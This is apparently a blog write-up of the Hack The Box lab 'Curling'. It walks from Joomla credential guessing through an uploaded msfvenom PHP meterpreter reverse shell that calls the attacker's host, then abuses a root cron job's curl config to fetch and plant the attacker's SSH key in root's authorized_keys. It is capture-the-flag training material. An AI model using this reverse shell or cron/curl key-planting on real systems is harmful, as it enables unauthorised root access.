---
layout: single
title: Curling - Hack The Box
excerpt: This is the writeup for Curling, a pretty easy box with Joomla running. We can log in after doing basic recon and some educated guessing of the password.
date: 2018-12-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-curling/curling_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
  - writeup
  - challenges
tags:  
  - joomla
  - ctf
  - cron
  - php
  - easy
  - hackthebox
published: true
---

![](/assets/images/htb-writeup-curling/curling_logo.png)

## Quick summary

- The username for the Joomla site is `Floris` which is the author of posts.
- The password is a variant of a word on the main page: `Curling2018!`
- On the Joomla admin page we can inject a meterpreter reverse shell in the `index.php` file of the template in-use
- After getting a shell, we can download a password backup file, which is compressed several times, and contains the password for user `floris`
- User `floris` controls a `input` file used by `curl` running in a root cronjob. We can change the config file so that cURL gets our SSH public key and saves it into the root ssh directory


```
echo "10.10.10.150 curling.htb" >> /etc/hosts
```


### Nmap

Start with a full TCP port scan which only found a webserver running on port 80 and ssh on 22 so not much to really work with.

```
# Nmap 7.70 scan initiated Tue Dec 11 13:41:24 2018 as: nmap -sSV -p0- -oA nmap_tcp_full curling.htb
Nmap scan report for htb.curling (10.10.10.150)
Host is up, received user-set (0.038s latency).
Scanned at 2018-12-11 13:41:59 GMT for 173s
Not shown: 65534 closed ports
Reason: 65534 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 208.44 seconds
```

### Joomla

Running nikto and joomscan didnt return anything of intreast. So started to have a mooch about noticing the following: 


1. The site name is **Cewl Curling site!**, a hint to use the [CeWL](https://digi.ninja/projects/cewl.php) tool to scrape a website generating wordlist from it. 

2. The first post reveals the username for the administrator: `Floris`

![](/assets/images/htb-writeup-curling/credentials.png)

Next had a look at the source code and noticed the following comment 

![](/assets/images/htb-writeup-curling/secret.png)

checking `/secret.txt` reveals a base64 string which i decoded to reveal `Curling2018!`

![](/assets/images/htb-writeup-curling/decode.png)

**Username:** Floris
**Password:** Curling2018!

Now can login to the admin page using the creds above - [http://curling.htb/administrator/index.php](http://curling.htb/administrator/index.php)

![](/assets/images/htb-writeup-curling/login.png)


# Getting a Shell 

Time to get a shell 

msfvenom was used to generate a simple php shell 

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.210 LPORT=4446 > php-meterpreter-staged-reverse-tcp-4666.php
```

The file upload functionality on the main page was abused to upload the shell sucessfully as it allows php files. 

![](/assets/images/htb-writeup-curling/php.png)

setup and run the msf handler

```
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost tun0
msf exploit(multi/handler) > set lport 4446
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.210:4446
```

Clicking on the link in the upload dialogue establishes the shell 

`http://10.10.10.150/images/php-meterpreter-staged-reverse-tcp-4666.php`


```
[*] Sending stage (38247 bytes) to 10.10.10.150
[*] Meterpreter session 1 opened (10.10.14.210:4666 -> 10.10.10.150:42196) at 2018-12-11 16:43:13 +0000

msf exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                   Information              Connection
  --  ----  ----                   -----------              ----------
  1         meterpreter php/linux  www-data (33) @ curling  10.10.14.210:4666 -> 10.10.10.150:42196 (10.10.10.150)

msf exploit(multi/handler) > sessions -1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer    : curling
OS          : Linux curling 4.15.0-22-generic #24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018 x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data (33)
meterpreter > 
```

Boom we get a shell as **www-data** :P


# Getting User 

unable to read `user.txt` due to insufficient permissons so need to esculate. 

looking around the system there is a intreasting file 

`/home/floris/password_backup`

```
cat password_backup
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

This looks like a **hex dump** 

copied the file of the box and used xxd to convert the file back into binary format

```
root@kali2:~/challenges/hackthebox/curling# xxd -r password_backup data.out
root@kali2:~/challenges/hackthebox/curling# file data.out              
data.out: bzip2 compressed data, block size = 900k
root@kali2:~/challenges/hackthebox/curling# cat data.out               
BZh91AY&SY���H���A��P)ava�:4N���nT#�@%�` 
"��n�                                    ��z�@�i�4hdi���9�h�Q�dh����4i�5n�׌��Jh��*��}y.�<~�x�>  �sVT�zH�ߢ�1�V��`F���s
     ۇ7j:X�dR��k�� ���)p�7۫;���9��PC�Y�P	�HB��*	��G� �U@r�rE8P����H#   
```


### bzip2

the file was confirmed to be a `bzip2` so let's decompress it...

```
root@kali2:~/challenges/hackthebox/curling# bzip2 -d data.out
bzip2: Can't guess original name for data.out -- using data.out.out
```

### gzip

another compressed file inside 

```
root@kali2:~/challenges/hackthebox/curling# file data.out.out                   
data.out.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size 141
root@kali2:~/challenges/hackthebox/curling# mv data.out.out data.gz
root@kali2:~/challenges/hackthebox/curling# gunzip data.gz
root@kali2:~/challenges/hackthebox/curling# file data
download: bzip2 compressed data, block size = 900k
```

### bzip...again

and another...:O

```
root@kali2:~/challenges/hackthebox/curling# mv data password.bz2
root@kali2:~/challenges/hackthebox/curling# bzip2 -d password.bz2
root@kali2:~/challenges/hackthebox/curling# file password
password: POSIX tar archive (GNU)
```

### tar

tar - it keeps on going 

```
root@kali2:~/challenges/hackthebox/curling# tar xvf password
password.txt
root@kali2:~/challenges/hackthebox/curling# cat password.txt
5d<wdCbdZu)|hChXll
```

woop! got there in the end 

Now on the box `su` was used to swtich over to `floris` and get the user flag.

```
python3 -c 'import pty;pty.spawn("/bin/sh")'
$ su -l floris
su -l floris
Password: 5d<wdCbdZu)|hChXll
floris@curling:~$ cat user.txt
cat user.txt
65dd1d...
```

# Privesc to Root 

First, let's upload our ssh key so we don't have to rely on that meterpreter shell and get in nice and easy 

```
floris@curling:~$ mkdir .ssh
mkdir .ssh
floris@curling:~$ echo "ssh-rsa AAAAB...DhscPOtelvd root@kali2" > .ssh/authorized_keys
<cPOtelvd root@kali2" > .ssh/authorized_keys
```

In `admin-area` folder, there are two files with a timestamp that keeps refreshing every few minutes:

```
floris@curling:~/admin-area$ ls -la
total 12
drwxr-x--- 2 root   floris 4096 May 22 19:04 .
drwxr-xr-x 7 floris floris 4096 Oct 27 20:39 ..
-rw-rw---- 1 root   floris   25 Oct 27 20:40 input
-rw-rw---- 1 root   floris    0 Oct 27 20:40 report
floris@curling:~/admin-area$ date
Sat Oct 27 20:40:44 UTC 2018
```

looks like there could be a cron job running as root. let's confirm this by running a simple `ps` command in a bash loop:

```
floris@curling:~/admin-area$ while true; do ps waux | grep report | grep -v "grep --color"; done
root      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```


As suspected, a cronjob executes curl using a `input` config file which we can write to.

We will change the file to fetch our SSH public key and save it into root's authorized_keys file:

```
floris@curling:~/admin-area$ echo -ne 'output = "/root/.ssh/authorized_keys"\nurl = "http://10.10.14.23/key.txt"\n' > input
floris@curling:~/admin-area$ cat input
output = "/root/.ssh/authorized_keys"
url = "http://10.10.14.23/key.txt"
```

When the cronjob runs, it fetches our public key:

```
root@kali2:~/challenges/hackthebox/curling# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.150 - - [11/Dec/2018 16:52:56] "GET /key.txt HTTP/1.1" 200 -
```

We can now SSH in as root:

```
root@kali2:~/challenges/hackthebox/curling# ssh root@curling.htb
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct 27 20:47:15 UTC 2018

  System load:  0.13              Processes:            181
  Usage of /:   46.3% of 9.78GB   Users logged in:      1
  Memory usage: 22%               IP address for ens33: 10.10.10.150
  Swap usage:   0%

  => There is 1 zombie process.


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@curling:~# cat root.txt
82c198...
```